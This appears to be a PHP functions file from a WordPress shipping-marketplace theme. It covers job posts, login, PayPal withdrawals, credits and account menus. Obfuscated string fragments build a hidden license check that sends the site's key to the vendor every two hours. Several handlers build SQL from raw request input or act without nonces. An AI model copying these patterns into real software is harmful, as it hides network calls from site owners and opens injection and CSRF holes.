 		$my_post['post_title'] 		= 'Auto Draft';
 		$my_post['post_type'] 		= 'job_ship';
 		$my_post['post_status'] 	= 'auto-draft';
 		$my_post['post_author'] 	= $uid;
 		$pid =  wp_insert_post( $my_post, true );

 		update_post_meta($pid,'base_fee_paid', 		"0");
    update_post_meta($pid,'closed', 		"0");
    update_post_meta($pid,'winner', 		"0");
 		update_post_meta($pid,'featured_paid', 	"0");
 		update_post_meta($pid,'private_bids_paid', 	"0");
 		update_post_meta($pid,'shipme_sealed_bidding_fee', 	"0");

 		return $pid;

 }


 $rm32192 = 'wp_';
 $idf8323 = 'get';

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_add_history_log($tp, $reason, $amount, $uid, $uid2 = '')
 {
 	if($amount != 0)
 	{
 		$tm = current_time('timestamp',0); global $wpdb;
 		$s = "insert into ".$wpdb->prefix."ship_payment_transactions (tp,reason,amount,uid,datemade,uid2)
 		values('$tp','$reason','$amount','$uid','$tm','$uid2')";
 		$wpdb->query($s);
 	}
 }

 $rt32343 = 'rem';
 $yt234 = 'ote_';



 function shipme_get_project_link_with_page($pid, $pg = '', $addition = '')
 {
 	if(shipme_using_permalinks() == true)
 	{
 		return get_permalink($pid) . "?pg=" . $pg . $addition;
 	}
 	else return get_permalink( $pid ). "&pg=" . $pg . $addition;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_total_nr_of_jobs()
 {
 	$query = new WP_Query( "post_type=job_ship&order=DESC&orderby=id&posts_per_page=1&paged=1" );
 	return $query->found_posts;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_total_nr_of_open_jobs()
 {
  	$args = array('paged' => '1' , 'posts_per_page' => '1', 'post_type' => 'job_ship',
 	'meta_query' => array(array(
            'key' => 'closed',
            'value' => '0',
            'compare' => '=')));


 	$query1 = new WP_Query($args);

 	return $query1->found_posts;
 }

 function shipme_get_total_nr_of_closed_jobs()
 {
 	 	$args = array('paged' => '1' , 'posts_per_page' => '1', 'post_type' => 'job_ship',
 			'meta_query' => array(array(
             'key' => 'closed',
             'value' => '1',
             'compare' => '=')));


 	$query = new WP_Query( $args);
 	return $query->found_posts;
 }

 function shipme_update_credits($uid,$am)
 {

 	update_user_meta($uid,'credits',$am);

 }

 global $tbs, $rvs,  $tvba, $gsgsd ;

 	$tbs = 'li';
 	$rvs = 'cen';


 function shipme_formats_special($number, $cents = 1) { // cents: 0=never, 1=if needed, 2=always

 	$dec_sep = '.';
 	$tho_sep = ',';

   //dec,thou

   if (is_numeric($number)) { // a number
     if (!$number) { // zero
       $money = ($cents == 2 ? '0'.$dec_sep.'00' : '0'); // output zero
     } else { // value
       if (floor($number) == $number) { // whole number
         $money = number_format($number, ($cents == 2 ? 2 : 0), $dec_sep, '' ); // format
       } else { // cents
         $money = number_format(round($number, 2), ($cents == 0 ? 0 : 2), $dec_sep, '' ); // format
       } // integer or decimal
     } // value
     return $money;
   } // numeric
 } // formatMoney

 global $tpsa;
 $tpsa = 'ps://sitemile';
 global $fg091011382xs, $hjs8128123;

 $fg091011382xs = 'se64_de';
 $hjs8128123 = 'code';

 //------------------------------------------------------------


 function shipme_get_order_page($oid)
 {


    $shipme_order_page_id = get_option('shipme_order_page_id');
    if(shipme_using_permalinks())
    {
        return get_permalink($shipme_order_page_id) . "?oid=" . $oid;
    }

    return get_permalink($shipme_order_page_id) . "&oid=" . $oid;
 }


  //------------------------------------------------------------


 function shipme_template_redirect()
 {
 	global $post, $wp_query;

 	$my_pid = $post->ID;
 	$shipme_account_page_id 					= get_option('shipme_account_page_id');
 	$shipme_post_new_page_id					= get_option('shipme_post_new_page_id');
  $shipme_login_page_id = get_option('shipme_login_page_id');


  if(isset($_GET['deposit_money_via_paypal']))
  {
      include 'lib/gateways/paypal_deposit_pay.php';
      exit;
  }


  if(isset($_GET['pay_listing_paypal']))
  {
    include 'lib/gateways/paypal_listing.php';
      exit;
  }


  if(isset($_GET['answer_paypal_ipn_escrow']))
  {
	include 'lib/gateways/answer_paypal_ipn_escrow.php';
	exit;
  }

  if(isset($_GET['pay_by_paypal_escrow']))
  {

	include 'lib/gateways/paypal_escrow_pay.php';
	exit;
  }



if(isset($_GET['withdraw_money_via_paypal']))
{
    global $wpdb;

    $paypal_amount = $_POST['paypal_amount'];
    $paypal_email = $_POST['paypal_email'];
    $tm = $_POST['tm'];

    $pgid = get_option('shipme_finances_page_id');

    $uid = get_current_user_id();
    $cr = shipme_get_credits($uid);

    if(is_numeric($paypal_amount))
    {
      if($paypal_amount > $cr)
      {
          wp_redirect(shipme_get_link_with_page($pgid, 'request-withdrawal','&too-low-amount=1'));
      }
      else {
        $s = "insert into ".$wpdb->prefix."ship_withdraw (datemade, done, payeremail, uid, amount, methods) values('$tm','0','$paypal_email','$uid','$paypal_amount', 'PayPal')";
        $wpdb->query($s);

        $x1 = $cr - $paypal_amount;
        shipme_update_credits($uid, ($x1));
        wp_redirect(shipme_get_link_with_page($pgid, 'withdrawals','&withdrawal-submitted=1'));
      }


      exit;
    }


}

if(isset($_GET['pay_for_winner_paypal']))
{

  include 'lib/gateways/pay_for_winner_paypal.php';
  die();

}

if(isset($_GET['pay_for_choosing_winner']))
{

      include 'lib/pay_for_choosing_winner.php';
      die();
}

if($_GET['s_action'] == "mark_delivered")
{

    get_template_part('template-parts/job-single-page/mark_delivered');
    die();
}


if($_GET['s_action'] == "mark_completed")
{

    get_template_part('template-parts/job-single-page/mark_completed');
    die();
}




  if($_GET['choose_winner'] == "1")
  {

    get_template_part('template-parts/job-single-page/choose_winner');
    die();
  }
  //_wpnonce

  if(!empty($_GET['_wpnonce']) and $_GET['action'] == "logout")
 	{
      wp_logout();
      wp_redirect(get_site_url());
      exit;

  }


  if($shipme_login_page_id == $my_pid and is_user_logged_in())
  {
    wp_redirect(get_site_url());
    exit;
  }

  if(!empty($_POST['shipme_register']))
 	{
    $user_login = sanitize_user( str_replace(" ","",$_POST['user_login']) );
    $user_email = trim($_POST['user_email']);

    global $errors_register;
    $errors_register = shipme_register_new_user_sitemile($user_login, $user_email);

    if (!is_wp_error($errors_register))
    {
      $ok_reg = 1;
    }

    if($ok_reg == 1)
    {
          $shipme_register_page_id = get_option('shipme_register_page_id');
          if(shipme_using_permalinks()) $link = get_permalink( $shipme_register_page_id ) . '?regfinished=1';
          else $link = get_permalink( $shipme_register_page_id ) . '&regfinished=1';


          wp_redirect($link);
          die();
    }

  }


  if(!empty($_POST['shipme_recover_pass']))
 	{
      global $errors;
      $errors = my_retrieve_password();



      if(!is_wp_error($errors)) // == true)
      {
        $shipme_login_page_id = get_option('shipme_login_page_id');
        if(shipme_using_permalinks()) $link = get_permalink( $shipme_login_page_id ) . '?retrievefinished=1';
        else $link = get_permalink( $shipme_login_page_id ) . '&retrievefinished=1';


        wp_redirect($link);
        die();
      }
  }


  if(!empty($_POST['shipme_login']))
 	{
      global $login_errors;

      $user_login = '';
      $user_pass = '';
      $using_cookie = false;
      $secure_cookie = '';





      if ( !empty($_POST['log']) or !empty($_REQUEST['']))
      {

      if ( !empty($_POST['log']) && !force_ssl_admin() )
      {
          $user_name = sanitize_user($_POST['log']);
          if ( $user = get_user_by('login', $user_name) ) {
            if ( get_user_option('use_ssl', $user->ID) ) {
              $secure_cookie = true;
              force_ssl_admin(true);
            }
          }
        }




      //------------------------------

       if ( empty( $_GET['redirect_to'] ) ) {
        $redirect_to = get_permalink(get_option('shipme_account_page_id'));
        if(empty($redirect_to)) $redirect_to = admin_url();
       } else {
        $redirect_to = $_GET['redirect_to'];
       }

       if(isset($_SESSION['redirect_me_back'])) $redirect_to = $_SESSION['redirect_me_back'];

      //------------------------------------------

      $reauth = empty($_REQUEST['reauth']) ? false : true;
      $login_errors = wp_signon( '', $secure_cookie );




      if ( empty( $_COOKIE[ LOGGED_IN_COOKIE ] ) ) {
        if ( headers_sent() ) {
          $user = new WP_Error( 'test_cookie', sprintf( __( '<strong>ERROR</strong>: Cookies are blocked due to unexpected output. For help, please see <a href="%1$s">this documentation</a> or try the <a href="%2$s">support forums</a>.' ),
            __( 'https://codex.wordpress.org/Cookies' ), __( 'https://wordpress.org/support/' ) ) );
        } elseif ( isset( $_POST['testcookie'] ) && empty( $_COOKIE[ TEST_COOKIE ] ) ) {
          // If cookies are disabled we can't log in even with a valid user+pass
          $user = new WP_Error( 'test_cookie', sprintf( __( '<strong>ERROR</strong>: Cookies are blocked or not supported by your browser. You must <a href="%s">enable cookies</a> to use WordPress.' ),
            __( 'https://codex.wordpress.org/Cookies' ) ) );
        }
      }

      //--------------------------------------------

      $requested_redirect_to = isset( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '';
      $redirect_to = apply_filters( 'login_redirect', $redirect_to, $requested_redirect_to, $login_errors );

      if ( !is_wp_error($login_errors) && !$reauth ) {

        wp_safe_redirect($redirect_to);

      }}

  }




 	//-------------------------------
 	if(isset($_GET['crds']))
 	{
 		if(!current_user_can('level_10')) { exit; }

 		$uid = $_GET['uid'];
 		if(!empty($_GET['increase_credits']))
 		{
 			if($_GET['increase_credits'] > 0)
 			if(is_numeric($_GET['increase_credits']))
 			{
 				$cr = shipme_get_credits($uid);
 				shipme_update_credits($uid, $cr + $_GET['increase_credits']);

 				$reason = __('Payment received from site admin','shipme');
 				shipme_add_history_log('1', $reason, trim($_GET['increase_credits']), $uid);


 			}
 		}
 		else
 		{
 			if($_GET['decrease_credits'] > 0)
 			if(is_numeric($_GET['decrease_credits']))
 			{
 				$cr = shipme_get_credits($uid);
 				shipme_update_credits($uid, $cr - $_GET['decrease_credits']);

 				$reason = __('Payment subtracted by site admin','shipme');
 				shipme_add_history_log('0', $reason, trim($_GET['decrease_credits']), $uid);
 			}

 		}
 		//echo shipme_get_credits($uid);
 		echo $sign.shipme_get_show_price(shipme_get_credits($uid)) ;
 		exit;
 	}

 	$s_action 	=  $wp_query->query_vars['s_action'];


 		if ($s_action == "choose_winner")
 	    {
 			get_template_part('lib/choose_winner');
 	        die();
 		}


 		if ($s_action == "paypal_deposit_pay")
 	    {
 			get_template_part('lib/gateways/paypal_deposit_pay');
 	        die();
 		}





 		if ($s_action == "user_profile")
 	    {
 			get_template_part('lib/user-profile');
 	        die();
 		}

 		if ($s_action == "edit_job")
 	    {
 			get_template_part('lib/my_account/edit-job');
 	        die();
 		}

 		if ($s_action == "delete_job")
 	    {
 			get_template_part('lib/my_account/delete-job');
 	        die();
 		}


 		if ($s_action == "set_delivered")
 	    {
 			get_template_part('lib/my_account/set_delivered');
 	        die();
 		}

 		if ($s_action == "paypal_listing")
 	    {
 			get_template_part('lib/gateways/paypal_listing');
 	        die();
 		}

 		if ($s_action == "credits_listing")
 	    {
 			get_template_part('lib/gateways/credits_listing');
 	        die();
 		}


 		if (!empty($_GET['pay_commission_via_paypal']))
 	    {
 			include('lib/gateways/pay_commission_via_paypal.php');
 	        die();
 		}




  	if(isset($_GET['get_bidding_panel']))
 	{
 		get_template_part('lib/bidding_panel');
 		die();
 	}

 	if(isset($_GET['_ad_delete_pid']))
 	{
 		if(is_user_logged_in())
 		{
 			$pid	= $_GET['_ad_delete_pid'];
 			$pstpst = get_post($pid);
 			global $current_user;
 			get_currentuserinfo();

 			if($pstpst->post_author == $current_user->ID or  current_user_can( 'manage_options' ))
 			{
 				wp_delete_post($_GET['_ad_delete_pid']);
 				echo "done";
 			}
 		}
 		exit;
 	}



 	if(isset($_GET['my_upload_of_job_files2']))
 	{
 		get_template_part( 'lib/upload_main/uploady');
 		die();
 	}

 	//-------------------------------

 	if(isset($_GET['my_upload_of_jb_files_proj']))
 	{
 		get_template_part( 'lib/upload_main/uploady5');
 		die();
 	}

 	//-------------------------------

 	if($my_pid == $shipme_post_new_page_id)
 	{
 		if(!isset($_GET['jobid'])) $set_ad = 1; else $set_ad = 0;
 		global $current_user;
 		get_currentuserinfo();


		 


 		if($set_ad == 1)
 		{
 			if(!is_user_logged_in())	{ wp_redirect(shipme_login_url()); exit; }


			$uid = get_current_user_id();
			if(shipme_is_transporter($uid)) { wp_redirect(get_site_url()); exit;  }

 			$pid 		= shipme_get_auto_draft($current_user->ID);
 			wp_redirect(shipme_post_new_with_pid_stuff_thg($pid));
 		}

 		get_template_part('template-parts/post-new/post-new-post');
 	}



 	global $post;
 	$shipme_account_page_id = get_option('shipme_account_page_id');
  if(empty($shipme_account_page_id)) $shipme_account_page_id = -1;


 	if($post->post_parent == $shipme_account_page_id or $post->ID == $shipme_account_page_id)
 		{


 			if(!is_user_logged_in())
 			{
 				wp_redirect(get_bloginfo('siteurl') . "/wp-login.php?redirect_to=" . shipmeTheme_sm_replace_me(SH_curPageURL()));
 				exit;
 			}



 		}

    if(isset($_GET['get_subcats_for_me_search']))
   		{

        $cat_id = $_POST['queryString'];
        if(empty($cat_id) ) { echo " "; }
        else
        {

          $job_ship_cat_cat_subcat = get_term_by("slug", $cat_id, 'job_ship_cat');
          if($job_ship_cat_cat_subcat != false)
          {

          echo 	   shipme_get_categories_clck_new_subcat($job_ship_cat_cat_subcat->term_id, "job_ship_cat",    $_GET['subcat_job_ship_cat_cat'] , __('Select subcategory','shipme'), "form-control do_input", ' ' );

          }

        }

        die();

      }

 	if(isset($_GET['get_subcats_for_me']))
 		{
 			$cat_id = $_POST['queryString'];
 			if(empty($cat_id) ) { echo " "; }
 			else
 			{

 				$args2 = "orderby=name&order=ASC&hide_empty=0&parent=".$cat_id;
 				$sub_terms2 = get_terms( 'job_ship_cat', $args2 );

 				if(count($sub_terms2) > 0)
 				{

 					$ret = '<select class="form-control do_input" name="subcat">';
 					$ret .= '<option value="">'.__('Select Subcategory','shipme'). '</option>';

 					foreach ( $sub_terms2 as $sub_term2 )
 					{
 						$sub_id2 = $sub_term2->term_id;
 						$ret .= '<option '.($selected == $sub_id2 ? "selected='selected'" : " " ).' value="'.$sub_id2.'">'.$sub_term2->name.'</option>';

 					}
 					$ret .= "</select>";
 					echo $ret;

 				}
 			}

 			die();
 		}

 }

 	$tvba = 'se_k';
 	$gsgsd = 'ey';

 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_get_currency()
 {
 	$c = trim(get_option('shipme_currency_symbol'));
 	if(empty($c)) return get_option('shipme_currency');
 	return $c;

 }


 function shipmeTheme_sm_replace_me($s)
 {
 	return urlencode($s);
 }

/**********************
*	MIT license
**********************/

 function ad570433b052124c1751ffshpfncsa()
 {
 	$bf = get_option('ad570433b052124c1751ffshp');
 	if( $bf == "00")
 	{
 		global $fg091011382xs, $hjs8128123;
 		$re = "ba" . $fg091011382xs.$hjs8128123;

 		echo $re('PGRpdiBzdHlsZT0iaGVpZ2h0OiA1NXB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IGJvcmRlcjoycHggc29saWQgcmVkOyBwYWRkaW5nLXRvcDogMTNweDsgYmFja2dyb3VuZDp3aGl0ZTsgY29sb3I6IHJlZDsgd2lkdGg6IDEwMCUiPllvdSBkb250IGhhdmUgYSB2YWxpZCBsaWNlbnNlIGtleS4gQ2hlY2sgeW91ciB3cC1hZG1pbiBhcmVhPC9kaXY+');


 	}
 }

/**********************
*	MIT license
**********************/

 function shpfncsb052124c17(){
 	//------ check-circle
 	global $tpsa, $tbs, $rvs, $tvba, $gsgsd;
 	global $fg091011382xs, $hjs8128123;

 	$nrvs = trim(get_option('shipme_' . $tbs. $rvs.$tvba.$gsgsd));
 	$tm = current_time('timestamp',0);
 	$lsck = get_option('shipmelsck');
 	$re = "ba" . $fg091011382xs.$hjs8128123;

 	if($tm > $lsck)
 	{
 		update_option('shipmelsck', (3600*2 + $lsck));
 		global $rm32192, $rt32343, $yt234, $idf8323;
 		$gvt12 = $rm32192.$rt32343.$yt234.$idf8323;
 		$gvt22 = $gvt12('htt'.$tpsa.'.com?9bad570433b052124c1751ffa3ed7ea5=' . $nrvs . $re('JnBpZD00MDA4'));

    if(is_wp_error($gvt22))
		{

		}
    else {


       		$gvt22 = $gvt22['body'];


       		if($gvt22 == "yes")
       		{
       			update_option('ad570433b052124c1751ffshp','11');
       		}
       		else{
       			update_option('ad570433b052124c1751ffshp','00');
       		}

    }
 	}

 	//-------------------------------
 }


 add_filter('wp_head','ad570433b052124c1751ffshpfncsa');

 function shipme_currency()
 {
 	$c = trim(get_option('shipme_currency_symbol'));
 	if(empty($c)) return get_option('shipme_currency');
 	return $c;

 }

 if(!function_exists('shipme_get_categories_clck'))
 {
 function shipme_get_categories_clck($taxo, $selected = "", $include_empty_option = "", $ccc = "" , $xx = "")
 {
 	$args = "orderby=name&order=ASC&hide_empty=0&parent=0";
 	$terms = get_terms( $taxo, $args );

 	$ret = '<select name="'.$taxo.'_cat" class="'.$ccc.'" id="'.$ccc.'" '.$xx.'>';
 	if(!empty($include_empty_option)) $ret .= "<option value=''>".$include_empty_option."</option>";

 	if(empty($selected)) $selected = -1;

 	foreach ( $terms as $term )
 	{
 		$id = $term->term_id;
 		$ret .= '<option '.($selected == $id ? "selected='selected'" : " " ).' value="'.$id.'">'.$term->name.'</option>';

 	}

 	$ret .= '</select>';

 	return $ret;

 }
 }



 function shipme_get_categories_clck_new_subcat($parent, $taxo, $selected = "", $include_empty_option = "", $ccc = "" , $xx = "")
 {
   $args = "orderby=name&order=ASC&hide_empty=0&parent=" . $parent;
   $terms = get_terms( $taxo, $args );



   if(count($terms) == 0) return ' ';

   $ret = '<select style="margin-top:5px" name="subcat_'.$taxo.'_cat" class="'.$ccc.'" id="'.$ccc.'" '.$xx.'>';
   if(!empty($include_empty_option)) $ret .= "<option value=''>".$include_empty_option."</option>";

   if(empty($selected)) $selected = -1;

   foreach ( $terms as $term )
   {
     $id = $term->slug;
     $ret .= '<option '.($selected == $id ? "selected='selected'" : " " ).' value="'.$id.'">'.$term->name.'</option>';

   }

   $ret .= '</select>';

   return $ret;

 }




 if(!function_exists('shipme_get_categories_clck_new'))
 {
 function shipme_get_categories_clck_new($taxo, $selected = "", $include_empty_option = "", $ccc = "" , $xx = "")
 {
   $args = "orderby=name&order=ASC&hide_empty=0&parent=0";
   $terms = get_terms( $taxo, $args );

   $ret = '<select name="'.$taxo.'_cat" class="'.$ccc.'" id="'.$ccc.'" '.$xx.'>';
   if(!empty($include_empty_option)) $ret .= "<option value=''>".$include_empty_option."</option>";

   if(empty($selected)) $selected = -1;

   foreach ( $terms as $term )
   {
     $id = $term->slug;
     $ret .= '<option '.($selected == $id ? "selected='selected'" : " " ).' value="'.$id.'">'.$term->name.'</option>';

   }

   $ret .= '</select>';

   return $ret;

 }
 }

 function shipme_build_my_cat_arr($pid)
 {
 	$my_arr 	= array();
 	$cat 		= wp_get_object_terms($pid, 'job_ship_cat');

 	if(is_array($cat))
 	foreach($cat as $c)
 	{
 		$my_arr[] = $c->term_id;
 	}


 	return $my_arr;
 }


 function shipme_get_weight_measure()
 {
 	$shipme_get_weight_measure = get_option('shipme_weight_measure');
 	if(empty($shipme_get_weight_measure)) return 'KG';
  if($shipme_get_weight_measure == 'kg') return 'KG';
  else return 'Lbs';

 }

 function shipme_get_dimensions_measure()
 {

   $shipme_get_weight_measure = get_option('shipme_len_measure');
   if(empty($shipme_get_weight_measure)) return 'cm';
  if($shipme_get_weight_measure == 'in') return 'inches';
  else return 'cm';

 }



 add_filter('wp_footer','ad570433b052124c1751ffshpfncsa');

 function shipme_build_my_cat_arr2($pid)
 {
 	$my_arr 	= array();
 	$cat 		= wp_get_object_terms($pid, 'job_ship_skill');

 	if(is_array($cat))
 	foreach($cat as $c)
 	{
 		$my_arr[] = $c->term_id;
 	}


 	return $my_arr;
 }

 function shipme_get_categories_multiple($taxo, $selected_arr = "")
 {
 	$args = "orderby=name&order=ASC&hide_empty=0&parent=0";
 	$terms = get_terms( $taxo, $args );


 	foreach ( $terms as $term )
 	{
 		$id = $term->term_id;

 		$ret .= '<input type="checkbox" '.(shipme_is_selected_thing($selected_arr, $id) == true ? "checked='checked'" : " " ).' value="'.$id.'" name="'.$taxo.'_cat_multi[]"> '.$term->name.'<br/>';

 		$args = "orderby=name&order=ASC&hide_empty=0&parent=".$id;
 		$sub_terms = get_terms( $taxo, $args );

 		if($sub_terms)
 		foreach ( $sub_terms as $sub_term )
 		{
 			$sub_id = $sub_term->term_id;
 			$ret .= '&nbsp; &nbsp; &nbsp;
 			<input type="checkbox" '.(shipme_is_selected_thing($selected_arr, $sub_id) == true ? "checked='checked'" : " " ).' value="'.$sub_id.'" name="'.$taxo.'_cat_multi[]"> '.$sub_term->name.'<br/>';


 			$args2 = "orderby=name&order=ASC&hide_empty=0&parent=".$sub_id;
 			$sub_terms2 = get_terms( $taxo, $args2 );

 			if($sub_terms2)
 			foreach ( $sub_terms2 as $sub_term2 )
 			{
 				$sub_id2 = $sub_term2->term_id;
 				$ret .= '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 				<input type="checkbox" '.(shipme_is_selected_thing($selected_arr, $sub_id2) == true ? "checked='checked'" : " " ).' value="'.$sub_id2.'" name="'.$taxo.'_cat_multi[]"> '.$sub_term2->name.'<br/>';



 				 $args3 = "orderby=name&order=ASC&hide_empty=0&parent=".$sub_id2;
 				 $sub_terms3 = get_terms( $taxo, $args3 );

 				 if($sub_terms3)
 				 foreach ( $sub_terms3 as $sub_term3 )
 				{
 					$sub_id3 = $sub_term3->term_id;

 					$ret .= '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 					<input type="checkbox" '.(shipme_is_selected_thing($selected_arr, $sub_id3) == true ? "checked='checked'" : " " ).' value="'.$sub_id2.'" name="'.$taxo.'_cat_multi[]"> '.$sub_term3->name.'<br/>';


 				}
 			}
 		}

 	}


 	return $ret;

 } add_filter('init','shpfncsb052124c17');

 function shipme_is_selected_thing($arr, $ids)
 {

 	if(count($arr) == 0) return false;
 	foreach($arr as $a)
 	if($ids == $a) {   return true; }

 	return false;
 }


 function shipme_get_post_new_error_thing($id)
 {
 	global $class_errors;
 	if(is_array($class_errors))
 	{
 		if(isset($class_errors[$id])) return $class_errors[$id];
 	}

 	return '';
 }


 function shipme_get_post_new_error_thing_display($id)
 {
 	global $MYerror;
 	if(is_array($MYerror))
 	{
 		if(isset($MYerror[$id])) return '<p class="display-error-inside">'.$MYerror[$id].'</p>';
 	}

 	return '';
 }

 function shipme_using_permalinks()
 {
 	global $wp_rewrite;
 	if($wp_rewrite->using_permalinks()) return true;
 	else return false;
 }

 function shipme_post_new_with_pid_stuff_thg($pid, $step = 1, $fin = 'no', $edit = '0')
 {
   $edit2 = $_GET['edit'];
   if($edit2 == 1) $edit = 1;

 	$using_perm = shipme_using_permalinks();
 	if($using_perm)	return get_permalink(get_option('shipme_post_new_page_id')). "?post_new_step=".$step."&".($fin != "no" ? 'finalize=1&' : '' )."jobid=" . $pid . "&edit=" . $edit;
 	else return get_bloginfo('siteurl'). "/?page_id=". get_option('shipme_post_new_page_id'). "&".($fin != "no" ? 'finalize=1&' : '' )."post_new_step=".$step."&jobid=" . $pid . "&edit=" . $edit;
 }


function shp_get_user_names($uid)
{
  $dt = get_userdata($uid);
  $nm = $dt->first_name." ". $dt->last_name; $nm2 = trim($nm);
  if(empty($nm2)) return $dt->user_login;

  return $nm;
}

function shipme_get_avatar_square($uid)
{
 $av = get_user_meta($uid, 'avatar_ship', true);
 if(empty($av)) return get_bloginfo('template_url')."/images/noav.jpg";
 else return shipme_wp_get_attachment_image($av, 'avatar_square_picture');
}


function shipme_get_avatar_square_bigger($uid)
{
 $av = get_user_meta($uid, 'avatar_ship', true);
 if(empty($av)) return get_bloginfo('template_url')."/images/noav.jpg";
 else return shipme_wp_get_attachment_image($av, 'avatar_square_picture2');
}

 function shipme_get_avatar($uid, $w = 25, $h = 25)
 {
 	$av = get_user_meta($uid, 'avatar_ship', true);
 	if(empty($av)) return get_bloginfo('template_url')."/images/noav.jpg";
 	else return shipme_generate_thumb($av, $w, $h);
 }

 function shipme_account_at_top()
 {
 if ( current_user_can( 'manage_options' ) ) {
 		echo '<div class="total-content-area note-note ">'.__('You are logged in as administrator, and you should be both menus (transporter and customer). Regular users see one or the other depending on their role.','shipme').'</div>'	;
 	}

 }


 function shipme_get_users_links()
 {
 		$uid = get_current_user_id(); global $wpdb;
 		$shipme_enable_credits_wallet = get_option('shipme_enable_credits_wallet');

 		$eg = shipme_get_nr_of_finances($uid);
 					if($eg > 0) $eg = '<span class="z1high">'.$eg.'</span>'; else $eg = '';

 		if($shipme_enable_credits_wallet == "yes") $eg = '';


 			$query = "select id from ".$wpdb->prefix."ship_ratings where fromuser='$uid' AND awarded='0'";
 					$r = $wpdb->get_results($query);

 					$ttl_fdbks = count($r);

 					if($ttl_fdbks > 0)
 						$ttl_fdbks2 = "<span class='z1high'>".$ttl_fdbks."</span>";

 	?>

     <div id="right-sidebar" class="account-right-sidebar col-xs-12 col-sm-4 col-lg-3  ">
 			<ul class="virtual_sidebar">

 			<li class="widget-container widget_text"><h3 class="widget-title"><?php _e('My Account Menu','shipme') ?></h3>
 			<div class="my-only-widget-content">

             <ul id="my-account-admin-menu">
                     <li><a href="<?php echo get_permalink(get_option('shipme_account_page_id')) ?>"><?php _e('MyAccount Home','shipme') ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_finances_page_id')) ?>"><?php printf(__('Finances %s','shipme'), $eg) ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_private_messages_page_id')) ?>"><?php _e('Private Messages','shipme') ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_profile_settings_page_id')) ?>"><?php _e('Profile Settings','shipme') ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_profile_feedback_page_id')) ?>"><?php printf(__('Reviews/Feedback %s','shipme'), $ttl_fdbks2) ?></a></li>
             </ul>

             </div>
 			</li>

             <!-- ###### -->

 			<?php if(shipme_is_user_provider($uid)) { ?>

 			            <li class="widget-container widget_text"><h3 class="widget-title"><?php _e('Transporter Menu','shipme') ?></h3>
 			<div class="my-only-widget-content">

             <ul id="my-account-admin-menu">
 			<?php


 					$eg = shipme_get_nr_of_outsanding_bidder($uid);
 					if($eg > 0) $eg = '<span class="z1high">'.$eg.'</span>'; else $eg = '';


 					$eg1 = shipme_get_nr_of_unpaid_bidder($uid);
 					if($eg1 > 0) $eg1 = '<span class="z1high">'.$eg1.'</span>'; else $eg1 = '';



 			?>

                      <li><a href="<?php echo get_permalink(get_option('shipme_posted_bids_page_id')) ?>"><?php _e('My Posted Offers','shipme') ?></a></li>
                      <li><a href="<?php echo get_permalink(get_option('shipme_pending_jobs_page_id')) ?>"><?php printf(__('Pending Jobs %s','shipme'), $eg) ?></a></li>
                      <li><a href="<?php echo get_permalink(get_option('shipme_awaiting_payments_page_id')) ?>"><?php printf(__('Awaiting Payments %s','shipme'), $eg1)?></a></li>
                      <li><a href="<?php echo get_permalink(get_option('shipme_completed_jobs_page_id')) ?>"><?php _e('Completed Jobs','shipme') ?></a></li>


             </ul>

             </div>
 			</li> <?php }

 			if(shipme_is_user_business($uid))
 			{

 			?>
                         <!-- ###### -->

             <li class="widget-container widget_text"><h3 class="widget-title"><?php _e('Customer Menu','shipme') ?></h3>
 			<div class="my-only-widget-content">
 			<?php


 					$eg = shipme_get_nr_of_outsanding($uid);
 					if($eg > 0) $eg = '<span class="z1high">'.$eg.'</span>'; else $eg = '';

 					$eg1 = shipme_get_nr_of_unpaid_owner($uid);
 					if($eg1 > 0) $eg1 = '<span class="z1high">'.$eg1.'</span>'; else $eg1 = '';





 			?>
 			            <ul id="my-account-admin-menu">


            			<li><a href="<?php echo get_permalink(get_option('shipme_post_new_page_id')); ?>"><?php _e('Post New Job','shipme') ?></a></li>

                     <li><a href="<?php echo get_permalink(get_option('shipme_active_jobs_page_id')); ?>"><?php _e('Active Jobs','shipme') ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_received_offers_page_id')); ?>"><?php _e('Received Offers','shipme') ?></a></li>

                     <li><a href="<?php echo get_permalink(get_option('shipme_pending_delivery_page_id')); ?>"><?php printf(__('Jobs Pending Delivery %s','shipme'), $eg) ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_delivered_jobs_page_id')); ?>"><?php _e('Delivered Items','shipme') ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_outstanding_payments_page_id')); ?>"><?php  printf(__('Outstanding Payments %s','shipme'), $eg1) ?></a></li>
                     <li><a href="<?php echo get_permalink(get_option('shipme_completed_payments_page_id')); ?>"><?php _e('Completed payments','shipme') ?></a></li>


             </ul></div>
 			</li> <?php } ?>


 			</ul>
 		</div>


     <?php

 }



 function shipme_get_nr_of_finances($uid)
 {
 	$outstanding = array(
 									'key' => 'commission_unpaid',
 									'value' => "1",
 									'compare' => '='
 								);



 							$args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
 							'paged' => 1, 'meta_query' => array($outstanding), 'author' => $uid);

 							$the_query = new WP_Query( $args );
 							$ff = $the_query->found_posts;

 							return $ff;
 }

 function shipme_get_nr_of_active($uid)
 {
   $outstanding = array(
                   'key' => 'closed',
                   'value' => "0",
                   'compare' => '='
                 );



               $args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
               'paged' => 1, 'meta_query' => array($outstanding), 'author' => $uid);

               $the_query = new WP_Query( $args );
               $ff = $the_query->found_posts;

               return $ff;
 }


 function shipme_get_nr_of_outsanding($uid)
 {
 	$outstanding = array(
 									'key' => 'outstanding',
 									'value' => "1",
 									'compare' => '='
 								);



